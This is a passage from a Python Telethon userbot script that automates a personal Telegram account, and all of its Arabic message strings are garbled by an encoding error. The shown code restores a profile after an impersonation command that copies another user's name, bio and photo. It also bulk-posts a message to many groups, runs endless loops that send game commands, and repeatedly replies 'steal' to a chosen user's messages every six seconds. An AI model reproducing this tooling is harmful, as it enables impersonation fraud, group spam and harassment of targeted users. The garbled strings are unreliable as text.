                    await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ŸÖÿπÿßŸÑÿ¨ÿ© ÿßŸÑÿµŸàÿ±ÿ©: {e}")
                except Exception as e:
                    await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ∫Ÿäÿ± ŸÖÿ≠ÿØÿØ ÿ£ÿ´ŸÜÿßÿ° ÿ™ÿ∫ŸäŸäÿ± ÿµŸàÿ±ÿ© ÿßŸÑÿ≠ÿ≥ÿßÿ®: {e}")
            else:
                await event.reply("‚éô ŸÑÿß ŸäŸÖŸÑŸÉ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿµŸàÿ±ÿ© ÿ£Ÿà ÿ™ÿπÿ∞ÿ± ÿ™ÿ≠ŸÖŸäŸÑ ÿßŸÑÿµŸàÿ±ÿ©.")
        else:
            await event.reply("‚éô ŸÑÿß ŸäŸÖŸÑŸÉ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿµŸàÿ±ÿ©.")


async def restore_profile(event):
    try:
        
        if os.path.exists("account_info.txt"):
            with open("account_info.txt", "r", encoding="utf-8") as f:
                data = f.readlines()
                restored_name = data[0].replace("Name: ", "").strip()
                restored_bio = data[1].replace("Bio: ", "").strip()
            
            await client(UpdateProfileRequest(first_name=restored_name, about=restored_bio))
            await event.delete()
            await event.reply(f"‚éô ÿ™ŸÖ ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ÿßŸÑÿßÿ≥ŸÖ ÿ•ŸÑŸâ {restored_name} ŸàÿßŸÑÿ®ÿßŸäŸà ÿ•ŸÑŸâ: {restored_bio}")
        else:
            await event.reply("‚éô ŸÖŸÑŸÅ ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ∫Ÿäÿ± ŸÖŸàÿ¨ŸàÿØ.")

        
        photo_path = "imagee/my_profile.jpg"  
        if os.path.exists(photo_path):
            uploaded_file = await client.upload_file(photo_path)

            
            await client(DeletePhotosRequest(await client.get_profile_photos('me')))

            
            await client(UploadProfilePhotoRequest(file=uploaded_file))
            
            await event.delete()
            await event.reply("‚éô ÿ™ŸÖ ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ÿµŸàÿ±ÿ© ÿßŸÑÿ≠ÿ≥ÿßÿ® ÿ®ŸÜÿ¨ÿßÿ≠.")
        else:
            await event.reply("‚éô ÿ™ÿπÿ∞ÿ± ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑÿµŸàÿ±ÿ© ÿßŸÑŸÖÿ≠ŸÅŸàÿ∏ÿ©.")
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿßÿ≥ÿ™ÿ±ÿ¨ÿßÿπ ÿßŸÑÿ≠ÿ≥ÿßÿ®: {e}")


@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÜÿ™ÿ≠ÿßŸÑ'))
async def handle_impersonate(event):
    await impersonate_user(event)
    await event.delete()


@client.on(events.NewMessage(from_users='me', pattern='.ÿßÿ±ÿ¨ÿßÿπ'))
async def handle_restore(event):
    await restore_profile(event)
    await event.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ŸÜÿ¥ÿ± ŸÖÿ¨ŸÖŸàÿπÿßÿ™'))
async def publish_message(event):
    await event.delete()
    try:
        
        command, args = event.raw_text.split(' ', 1)
        num_groups, message = args.split('(', 1)[1].split(')')[0], args.split(')', 1)[1].strip()
        num_groups = int(num_groups)
        
        
        dialogs = await client.get_dialogs()
        groups = [dialog for dialog in dialogs if dialog.is_group]
        
        if len(groups) < num_groups:
            await event.reply(f"‚éô ÿπÿØÿØ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™ ÿßŸÑŸÖÿ™ÿßÿ≠ÿ© ÿ£ŸÇŸÑ ŸÖŸÜ {num_groups}.")
            return
        
        
        published_message_ids = []
        for group in groups[:num_groups]:
            msg = await client.send_message(group, message)
            published_message_ids.append((group.id, msg.id))
        
        
        published_messages.append({
            'message': message,
            'group_ids': [group.id for group in groups[:num_groups]],
            'message_ids': published_message_ids
        })
        with open(published_messages_file, 'wb') as f:
            pickle.dump(published_messages, f)
        
        await event.reply(f"‚éô ÿ™ŸÖ ŸÜÿ¥ÿ± ÿßŸÑÿ±ÿ≥ÿßŸÑÿ© ŸÅŸä {num_groups} ŸÖÿ¨ŸÖŸàÿπÿ©.")
    except (ValueError, IndexError):
        await event.reply("‚éô ÿßÿ≥ÿ™ÿÆÿØŸÖ ÿßŸÑÿµŸäÿ∫ÿ©: ŸÜÿ¥ÿ± (ÿπÿØÿØ ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿßÿ™) ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©")
    except Exception as e:
        await event.reply(f"‚éô ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ŸÜÿ¥ÿ± ÿßŸÑÿ±ÿ≥ÿßŸÑÿ©: {e}")


if os.path.exists(muted_users_file):
    with open(muted_users_file, 'rb') as f:
        muted_users = pickle.load(f)
else:
    muted_users = set()


@client.on(events.NewMessage(from_users='me', pattern='.ŸÉÿ™ŸÖ'))
async def mute_user(event):
    await event.delete()
    if event.is_private:
        muted_users.add(event.chat_id)
        with open(muted_users_file, 'wb') as f:
            pickle.dump(muted_users, f)
        await event.reply(" **‚åî‚îäÿ™ŸÖ ÿßŸÑŸÉÿ™ŸÖ ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ‚åî‚îäŸÜÿ≠ŸÜ ÿ®ÿ≠ÿßÿ¨ÿ© ŸÑÿ®ÿπÿ∂ ÿßŸÑŸáÿØŸàÿ° ÿßÿµŸÖÿ™ ‚åî‚îäÿ™ŸÖ ŸÉÿ™ŸÖŸÄŸá ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ‚òëÔ∏è**")
    else:
        await event.reply("‚éô ŸäŸÖŸÉŸÜ ÿßÿ≥ÿ™ÿÆÿØÿßŸÖ Ÿáÿ∞ÿß ÿßŸÑÿ£ŸÖÿ± ŸÅŸä ÿßŸÑŸÖÿ≠ÿßÿØÿ´ÿßÿ™ ÿßŸÑÿÆÿßÿµÿ© ŸÅŸÇÿ∑.")

@client.on(events.NewMessage(from_users='me', pattern='.ÿ≥ŸÖÿßÿ≠'))
async def unmute_user(event):
    await event.delete()
    if event.is_private and event.chat_id in muted_users:
        muted_users.remove(event.chat_id)
        with open(muted_users_file, 'wb') as f:
            pickle.dump(muted_users, f)
        await event.reply("‚éô ÿ™ŸÖ ÿßŸÑÿ≥ŸÖÿßÿ≠ ŸÑŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ŸÑŸÑÿ™ÿ≠ÿØÿ´ ŸÖÿπŸÉ ÿßŸäŸáÿß ÿßŸÑŸÖŸÑŸÉ.")
    else:
        await event.reply("‚éô Ÿáÿ∞ÿß ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ∫Ÿäÿ± ŸÖŸÉÿ™ŸàŸÖ")

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸÑŸÖŸÉÿ™ŸàŸÖŸäŸÜ'))
async def show_muted_users(event):
    await event.delete()
    if muted_users:
        muted_users_list = "\n".join([str(user_id) for user_id in muted_users])
        await event.reply(f"‚éô ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖŸàŸÜ ÿßŸÑŸÖŸÉÿ™ŸàŸÖŸàŸÜ:\n{muted_users_list}")
    else:
        await event.reply("‚éô ŸÑÿß ŸäŸàÿ¨ÿØ ŸÖÿ≥ÿ™ÿÆÿØŸÖŸàŸÜ ŸÖŸÉÿ™ŸàŸÖŸàŸÜ ÿ≠ÿßŸÑŸäÿßŸã.")

from telethon import functions

active_ratib_timers = {}
active_bakhsheesh_timers = {}
active_sarqa_timers = {}

@client.on(events.NewMessage(from_users='me', pattern='.ÿ±ÿßÿ™ÿ®'))
async def enable_ratib_wad(event):
    await event.delete()
    reply = await event.respond("ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£ŸÖÿ± ÿ±ÿßÿ™ÿ®")
    await asyncio.sleep(1)
    await reply.delete()

    if event.chat_id not in active_ratib_timers:
        async def send_ratib():
            while True:
                await client.send_message(event.chat_id, "ÿ±ÿßÿ™ÿ®")
                await asyncio.sleep(660)  

        active_ratib_timers[event.chat_id] = asyncio.create_task(send_ratib())

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸäŸÇÿßŸÅ ÿ±ÿßÿ™ÿ®'))
async def disable_ratib_wad(event):
    await event.delete()

    if event.chat_id in active_ratib_timers:
        active_ratib_timers[event.chat_id].cancel()
        del active_ratib_timers[event.chat_id]
    
    reply = await event.respond("‚éô ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ£ŸÖÿ± ÿ±ÿßÿ™ÿ®")
    await asyncio.sleep(2)
    await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿ®ÿÆÿ¥Ÿäÿ¥'))
async def enable_bakhsheesh_wad(event):
    await event.delete()
    reply = await event.respond("‚éô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£ŸÖÿ± ÿ®ÿÆÿ¥Ÿäÿ¥")
    await asyncio.sleep(2)
    await reply.delete()

    if event.chat_id not in active_bakhsheesh_timers:
        async def send_bakhsheesh():
            while True:
                await client.send_message(event.chat_id, "ÿ®ÿÆÿ¥Ÿäÿ¥")
                await asyncio.sleep(660)  

        active_bakhsheesh_timers[event.chat_id] = asyncio.create_task(send_bakhsheesh())

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸäŸÇÿßŸÅ ÿ®ÿÆÿ¥Ÿäÿ¥'))
async def disable_bakhsheesh_wad(event):
    await event.delete()

    if event.chat_id in active_bakhsheesh_timers:
        active_bakhsheesh_timers[event.chat_id].cancel()
        del active_bakhsheesh_timers[event.chat_id]
    
    reply = await event.respond("‚éô ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ£ŸÖÿ± ÿ®ÿÆÿ¥Ÿäÿ¥")
    await asyncio.sleep(2)
    await reply.delete()

active_sarqa_timers = {}

@client.on(events.NewMessage(from_users='me', pattern='.ÿ≥ÿ±ŸÇÿ©(?: (\d+))?'))
async def enable_sarqa_wad(event):
    await event.delete()

    if event.pattern_match.group(1):
        user_id = int(event.pattern_match.group(1))

        if user_id not in active_sarqa_timers:
            reply = await event.respond("‚éô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£ŸÖÿ± ÿ≥ÿ±ŸÇÿ©")
            await asyncio.sleep(2)
            await reply.delete()

            async def send_sarqa():
                while True:
                    try:
                        async for message in client.iter_messages(event.chat_id, from_user=user_id, limit=1):
                            await client.send_message(event.chat_id, "ÿ≤ÿ±ŸÅ", reply_to=message.id)
                        await asyncio.sleep(6)  
                    except Exception as e:
                        print(f"Error: {e}")
                        break

            active_sarqa_timers[user_id] = asyncio.create_task(send_sarqa())
        else:
            reply = await event.respond("‚éô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£ŸÖÿ± ÿ≥ÿ±ŸÇÿ© ŸÖÿ≥ÿ®ŸÇŸãÿß.")
            await asyncio.sleep(2)
            await reply.delete()
    else:
        reply = await event.respond("Ÿäÿ±ÿ¨Ÿâ ŸÉÿ™ÿßÿ®ÿ© ÿßŸäÿØŸä ÿßŸÑÿ¥ÿÆÿµ ŸÖÿπ ÿßŸÑÿßŸÖÿ±!")
        await asyncio.sleep(2)
        await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿßŸäŸÇÿßŸÅ ÿ≥ÿ±ŸÇÿ©(?: (\d+))?'))
async def disable_sarqa_wad(event):
    await event.delete()

    if event.pattern_match.group(1):
        user_id = int(event.pattern_match.group(1))

        if user_id in active_sarqa_timers:
            active_sarqa_timers[user_id].cancel()
            del active_sarqa_timers[user_id]
            
            reply = await event.respond("‚éô ÿ™ŸÖ ÿ•ŸäŸÇÿßŸÅ ÿ£ŸÖÿ± ÿ≥ÿ±ŸÇÿ©")
            await asyncio.sleep(2)
            await reply.delete()
        else:
            reply = await event.respond("‚éô ŸÑŸÖ Ÿäÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿ£ŸÖÿ± ÿ≥ÿ±ŸÇÿ© ŸàÿπÿØ ŸÑŸáÿ∞ÿß ÿßŸÑÿ¥ÿÆÿµ.")
            await asyncio.sleep(2)
            await reply.delete()
    else:
        reply = await event.respond("Ÿäÿ±ÿ¨Ÿâ ŸÉÿ™ÿßÿ®ÿ© ÿßŸäÿØŸä ÿßŸÑÿ¥ÿÆÿµ ŸÖÿπ ÿßŸÑÿßŸÖÿ±!")
        await asyncio.sleep(2)
        await reply.delete()

@client.on(events.NewMessage(from_users='me', pattern='.ÿ±ŸÅÿπ ÿ∑Ÿäÿ≤'))
async def enable_ratib_wad(event):
    await event.delete()
    reply = await event.respond("ÿ™ŸÖ ÿ±ŸÅÿπŸá ÿ∑Ÿäÿ≤ ÿ®ŸÜÿ¨ÿßÿ≠ ‚éô")
    await asyncio.sleep(1)
    await reply.delete()
    
@client.on(events.NewMessage(outgoing=True, pattern=r'\.ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™'))
async def leave_channels(event):
    await event.edit("**ÿ¨ÿßÿ±Ÿç ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÇŸÜŸàÿßÿ™...**")
    async for dialog in client.iter_dialogs():
        if dialog.is_channel and not (dialog.is_group or dialog.entity.admin_rights or dialog.entity.creator):
            await client.delete_dialog(dialog)
    await event.edit("**ÿ™ŸÖ ŸÖÿ∫ÿßÿØÿ±ÿ© ÿ¨ŸÖŸäÿπ ÿßŸÑŸÇŸÜŸàÿßÿ™**")

@client.on(events.NewMessage(outgoing=True, pattern=r'\.ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÉÿ±Ÿàÿ®ÿßÿ™'))
async def leave_groups(event):
    await event.edit("**ÿ¨ÿßÿ±Ÿç ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÉÿ±Ÿàÿ®ÿßÿ™...**")
    async for dialog in client.iter_dialogs():
        if dialog.is_group and not (dialog.entity.admin_rights or dialog.entity.creator):
            try:
                await client.delete_dialog(dialog)
            except Exception as e:
                print(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ŸÖÿ∫ÿßÿØÿ±ÿ© ÿßŸÑŸÉÿ±Ÿàÿ® {dialog.name}: {e}")  # ÿ∑ÿ®ÿßÿπÿ© ÿßŸÑÿÆÿ∑ÿ£ ŸÑŸÑŸÖÿ≥ÿßÿπÿØÿ© ŸÅŸä ÿ™ÿ≠ÿØŸäÿØ ÿßŸÑŸÖÿ¥ŸÉŸÑÿ©
    await event.edit("**ÿ™ŸÖ ŸÖÿ∫ÿßÿØÿ±ÿ© ÿ¨ŸÖŸäÿπ ÿßŸÑŸÉÿ±Ÿàÿ®ÿßÿ™**")
    
@client.on(events.NewMessage(pattern=r'\.ÿ®ŸÜÿ¨$'))
async def ping(event):
    client.parse_mode = "html" 
    start = datetime.now()
    msg = await event.edit("ÿ≥ÿ±ÿπÿ© ÿßŸÑÿßŸÜÿ™ÿ±ŸÜŸäÿ™!")
    end = datetime.now()
    ms = (end - start).microseconds / 1000
    await msg.edit(f"<b>ÿ≥ÿ±ÿπÿ© ÿßŸÜÿ™ÿ±ŸÜÿ™ŸÉ!!<b/>\n`{ms} ms`")
        
questions_list = [
    "ŸáŸÑ ÿ™ÿ≠ÿ® ÿßŸäŸÅÿß ÿü",
    "ÿ≠ŸÉŸä ŸàÿØŸÉ ŸäŸàÿµŸÑ ŸÑŸÑÿ¥ÿÆÿµ ÿßŸÑŸÖÿ∑ŸÑŸàÿ® ÿü",
    "ŸÖŸÜÿ¥ŸÜ ÿ¥ÿÆÿµ ÿ™ÿ≥ŸàŸÑŸÅ ŸÖÿπŸá ÿ™ŸÜÿ≥Ÿâ ŸáŸÖŸàŸÖ ÿßŸÑÿØŸÜŸäÿß ÿü",
    "ŸÖŸÇŸàŸÑŸá ÿßŸà ŸÖÿ´ŸÑ ÿßŸà ÿ®Ÿäÿ™ ÿ¥ÿπÿ± ŸÇÿ±Ÿäÿ® ŸÖŸÜ ŸÇŸÑÿ®ŸÉÿü",
    "ÿßŸÉÿ´ÿ± ŸÖŸÉÿßŸÜ ÿ™ÿ≠ÿ® ÿ™ÿ±Ÿàÿ≠ ŸÑŸá ŸÅ ÿßŸÑŸàŸäŸÉŸÜÿØ ÿü",
    "ŸÉŸÖ Ÿàÿ¨ÿ®Ÿá ÿ™ÿ¢ŸÉŸÑ ŸÅ ÿßŸÑŸäŸàŸÖ ÿü",
    "ŸÉŸÖ ÿ≥ÿßÿπŸá ÿ™ŸÜÿßŸÖ ŸÅ ÿßŸÑŸäŸàŸÖ ÿü",
    "ŸáŸÑ Ÿàÿ´ŸÇÿ™ ŸÅ ÿßÿ≠ÿØ Ÿà ÿÆÿ∞ŸÑŸÉ ÿü",
    "ŸÉŸÑŸÖŸá ÿ™ÿπÿ®ÿ± ÿπŸÜ ÿ¥ÿπŸàÿ±ŸÉ ÿü",
    "ŸÖŸÜÿ¥ŸÜ ÿ¥ÿÆÿµ ŸÅÿßŸáŸÖŸÉ ŸÅ ŸÉŸÑ ÿ¥Ÿäÿ° ÿü",
    "ŸÖŸÜÿ¥ŸÜ ÿ¥ÿÆÿµ ÿ™ÿ≥ŸàŸÑŸÅ ŸÖÿπŸá ÿ™ŸÜÿ≥Ÿâ ŸáŸÖŸàŸÖ ÿßŸÑÿØŸÜŸäÿß ÿü",
    "ÿßÿµÿØŸÇÿßÿ° ÿßŸÑŸÖŸàÿßŸÇÿπ ÿßŸÅÿ∂ŸÑ ŸÖŸÜ ÿßŸÑŸàÿßŸÇÿπ ÿ™ÿ™ŸÅŸÇÿü",
    "ŸÉŸÑŸÖŸá ŸÖÿπŸäŸÜŸá ŸÖ ŸäŸÅŸáŸÖŸáÿß ÿßŸÑÿß ÿßÿµÿ≠ÿßÿ®ŸÉ ÿü",
    "ŸÉŸÑ ÿ¥Ÿäÿ° ŸäŸáŸàŸÜ ÿßŸÑÿß ÿü",
    "ŸÉŸÑŸÖŸá ÿ™ÿπÿ®ÿ± ÿπŸÜ ÿ¥ÿπŸàÿ±ŸÉ ÿü",
    "ŸÉŸäŸÅ ÿ™ÿ™ÿµÿ±ŸÅ ŸÖÿπ ÿ¥ÿÆÿµ ÿ™ŸÉŸÑŸÖŸá ŸÅŸä ÿ≥ÿßŸÑŸÅŸá ŸÖŸáŸÖŸá ŸàŸäÿµÿ±ŸÅŸÉ ŸàŸÖÿπÿØ Ÿäÿ±ÿØ ÿßÿ®ÿØÿßŸãÿü",
    "ÿ´ŸÑÿßÿ´ ÿßÿ¥Ÿäÿßÿ° ÿ¨ŸÜÿ®ŸÉ ÿßŸÑÿ≠ŸäŸÜ ÿü",
    "ÿ™ÿ¥ŸàŸÅ ÿßŸÜŸà ÿßŸÑÿ™ŸàÿßÿµŸÑ ÿ®ÿ¥ŸÉŸÑ ŸäŸàŸÖŸä ŸÖŸÜ ÿßÿ≥ÿßÿ≥Ÿäÿßÿ™ ÿßŸÑÿ≠ÿ® ÿü",
    "ŸÜŸàÿπŸäÿßÿ™ ŸàÿØŸÉ ŸäŸÜŸÇÿ±ÿ∂ŸàŸÜ ŸÖŸÜ ÿ™ŸàŸäÿ™ÿ±ÿü",
    "ŸÖÿßÿ∞ÿß ÿ™ŸÅÿπŸÑ ÿπŸÜÿØŸÖÿß ÿ™ÿ±Ÿä ÿØŸÖŸàÿπ ÿ≤Ÿàÿ¨ÿ™ŸÉ..ÿü",
    "ŸÖÿß ŸáŸä ŸáŸàÿßŸäÿ™ŸÉ ÿßŸÑŸÖŸÅÿ∂ŸÑÿ©ÿü",
    "ŸÑŸà ÿÆŸäÿ±ŸàŸÉ ÿ™ÿ≥ÿßŸÅÿ± ŸÑÿ£Ÿä ŸÖŸÉÿßŸÜ ŸÅŸä ÿßŸÑÿπÿßŸÑŸÖÿå ŸàŸäŸÜ ÿ®ÿ™ÿ±Ÿàÿ≠ÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿßŸÉŸÑÿ© ÿ™ÿ≠ÿ®Ÿáÿßÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ŸÑŸàŸÜ ÿ™ÿ≠ÿ®Ÿáÿü",
    "ÿ™ÿ≠ÿ® ÿßŸÑŸÇŸáŸàÿ© ÿßŸà ÿßŸÑÿ¥ÿßŸäÿü",
    "ÿßŸäÿ¥ ŸÖŸàŸÇŸÅ ÿµÿßÿ± ŸÑŸÉ ŸÖÿß ÿ™ŸÜÿ≥ÿßŸáÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿ¥Ÿäÿ° Ÿäÿ∂ÿßŸäŸÇŸÉÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿ¥Ÿäÿ° Ÿäÿ≥ÿπÿØŸÉÿü",
    "ÿßŸäÿ¥ ŸáŸä ÿßŸÖŸÜŸäÿ™ŸÉ ŸÅŸä ÿßŸÑÿ≠Ÿäÿßÿ©ÿü",
    "ŸÑŸà ŸÉÿßŸÜ ÿ®ÿ•ŸÖŸÉÿßŸÜŸÉ ÿ™ÿ∫ŸäŸäÿ± ÿ¥Ÿäÿ° Ÿàÿßÿ≠ÿØ ŸÅŸä ÿßŸÑÿπÿßŸÑŸÖÿå ŸÖÿßÿ∞ÿß ÿ≥ŸäŸÉŸàŸÜÿü",
    "ŸáŸÑ ÿ™ÿ§ŸÖŸÜ ÿ®ÿßŸÑÿ≠ÿ® ŸÖŸÜ ÿßŸàŸÑ ŸÜÿ∏ÿ±ÿ©ÿü",
    "ŸáŸÑ ÿßŸÜÿ™ ÿ¥ÿÆÿµ ÿµÿ®ÿßÿ≠Ÿä ÿßŸà ŸÖÿ≥ÿßÿ¶Ÿäÿü",
    "ŸÖÿß ŸáŸà ÿ®ÿ±ÿ¨ŸÉÿü",
    "ŸÖÿß ŸáŸà ŸÅŸäŸÑŸÖŸÉ ÿßŸÑŸÖŸÅÿ∂ŸÑÿü",
    "ŸÖÿß ŸáŸä ÿßÿ∫ŸÜŸäÿ™ŸÉ ÿßŸÑŸÖŸÅÿ∂ŸÑÿ©ÿü",
    "ŸÖÿß ŸáŸä ŸÅÿ±ŸÇÿ™ŸÉ ÿßŸÑŸÖŸàÿ≥ŸäŸÇŸäÿ© ÿßŸÑŸÖŸÅÿ∂ŸÑÿ©ÿü",
    "ŸÖÿß ŸáŸà ŸÉÿ™ÿßÿ®ŸÉ ÿßŸÑŸÖŸÅÿ∂ŸÑÿü",
    "ŸÖÿß ŸáŸà ŸÖÿ≥ŸÑÿ≥ŸÑ Netflix  ÿßŸÑŸÖŸÅÿ∂ŸÑ ŸÑÿØŸäŸÉÿü",
    "ŸáŸÑ ÿ™ŸÅÿ∂ŸÑ ÿßŸÑÿµŸäŸÅ ÿßŸà ÿßŸÑÿ¥ÿ™ÿßÿ°ÿü",
    "ŸáŸÑ ÿ™ŸÅÿ∂ŸÑ ÿßŸÑÿπŸäÿ¥ ŸÅŸä ÿßŸÑŸÖÿØŸäŸÜÿ© ÿßŸà ÿßŸÑÿ±ŸäŸÅÿü",
    "ŸáŸÑ ÿ™ŸÅÿ∂ŸÑ ÿßŸÑŸÉŸÑÿßÿ® ÿßŸà ÿßŸÑŸÇÿ∑ÿ∑ÿü",
    "ŸÖÿß ŸáŸà ÿ±ÿ£ŸäŸÉ ŸÅŸä Ÿàÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿ™ŸàÿßÿµŸÑ ÿßŸÑÿßÿ¨ÿ™ŸÖÿßÿπŸäÿü",
    "ŸÖÿß ŸáŸä ŸÜÿµŸäÿ≠ÿ™ŸÉ ŸÑÿ£Ÿä ÿ¥ÿÆÿµ ŸäŸÖÿ± ÿ®ŸäŸàŸÖ ÿ≥Ÿäÿ°ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä ÿ™ŸÅÿ™ÿÆÿ± ÿ®Ÿáÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä ÿ™ÿÆÿßŸÅ ŸÖŸÜŸáÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ∂ÿ≠ŸÉÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ®ŸÉŸäÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä Ÿäÿ¨ÿπŸÑŸÉ ÿ™ÿ¥ÿπÿ± ÿ®ÿßŸÑÿßŸÖÿ™ŸÜÿßŸÜÿü",
    "ŸÖÿß ŸáŸà ÿ™ÿπÿ±ŸäŸÅŸÉ ŸÑŸÑÿ≥ÿπÿßÿØÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿ™ÿπÿ±ŸäŸÅŸÉ ŸÑŸÑŸÜÿ¨ÿßÿ≠ÿü",
    "ŸÑŸà ŸÉÿßŸÜ ÿ®ÿ•ŸÖŸÉÿßŸÜŸÉ ÿßŸÖÿ™ŸÑÿßŸÉ ÿßŸä ŸÇŸàÿ© ÿÆÿßÿ±ŸÇÿ©ÿå ŸÖÿßÿ∞ÿß ÿ≥ÿ™ÿÆÿ™ÿßÿ±ÿü",
    "ŸÑŸà ŸÉÿßŸÜ ÿ®ÿ•ŸÖŸÉÿßŸÜŸÉ ÿßŸÑÿπŸàÿØÿ© ÿ®ÿßŸÑÿ≤ŸÖŸÜÿå ÿßŸÑŸâ ÿßŸä ŸÅÿ™ÿ±ÿ© ÿ≤ŸÖŸÜŸäÿ© ÿ≥ÿ™ÿπŸàÿØÿü",
    "ŸÖŸÜ ŸáŸà ŸÖÿ´ŸÑŸÉ ÿßŸÑÿ£ÿπŸÑŸâÿü",
    "ŸÖÿß ŸáŸä ÿ£ŸÉÿ®ÿ± ÿ∫ŸÑÿ∑ÿ© ÿ≥ŸàŸäÿ™Ÿáÿß ŸÅŸä ÿ≠Ÿäÿßÿ™ŸÉÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿØÿ±ÿ≥ ÿßŸÑŸÑŸä ÿ™ÿπŸÑŸÖÿ™Ÿá ŸÖŸÜ Ÿáÿ∞Ÿä ÿßŸÑÿ∫ŸÑÿ∑ÿ©ÿü",
    "ŸÖÿß ŸáŸä ÿ£ŸÅÿ∂ŸÑ ŸÜÿµŸäÿ≠ÿ©  ÿßŸÜÿπÿ∑ÿ™ ŸÑŸÉÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿ¥Ÿäÿ° ÿ™ÿπŸÑŸÖÿ™Ÿá ŸÖŸÜ ŸàÿßŸÑÿØŸäŸÉÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿ¥Ÿäÿ° ÿ™ÿ≠ÿ®Ÿá ŸÅŸä ŸÜŸÅÿ≥ŸÉÿü",
    "ÿßŸäÿ¥ ÿßŸÉÿ´ÿ± ÿ¥Ÿäÿ° ÿ™ŸÉÿ±ŸáŸá ŸÅŸä ŸÜŸÅÿ≥ŸÉÿü",
    "ŸÉŸäŸÅ ÿ™ÿµŸÅ ŸÜŸÅÿ≥ŸÉ ŸÅŸä ÿ´ŸÑÿßÿ´ ŸÉŸÑŸÖÿßÿ™ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä ŸäŸÖŸäÿ≤ŸÉ ÿπŸÜ ÿ∫Ÿäÿ±ŸÉÿü",
    "ŸÖÿß ŸáŸä ÿ∑ŸÖŸàÿ≠ÿßÿ™ŸÉ ÿßŸÑŸÖÿ≥ÿ™ŸÇÿ®ŸÑŸäÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿßŸÑÿ¥Ÿäÿ° ÿßŸÑÿ∞Ÿä ÿ™ÿ™ŸÖŸÜŸâ ÿ™ÿ≠ŸÇŸäŸÇŸá ŸÇÿ®ŸÑ ŸÖÿß ÿ™ŸÖŸàÿ™ÿü",
    "ŸáŸÑ ÿ™ÿ§ŸÖŸÜ ÿ®ÿßŸÑÿ≠Ÿäÿßÿ© ÿ®ÿπÿØ ÿßŸÑŸÖŸàÿ™ÿü",
    "ŸáŸÑ ÿ™ÿ§ŸÖŸÜ ÿ®ÿßŸÑÿ£ÿ¥ÿ®ÿßÿ≠ÿü",
    "ŸáŸÑ ÿ™ÿ§ŸÖŸÜ ÿ®ÿßŸÑŸÉÿßÿ¶ŸÜÿßÿ™ ÿßŸÑŸÅÿ∂ÿßÿ¶Ÿäÿ©ÿü",
    "ŸÖÿß ŸáŸà ÿ±ÿ£ŸäŸÉ ŸÅŸä ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸäÿü",
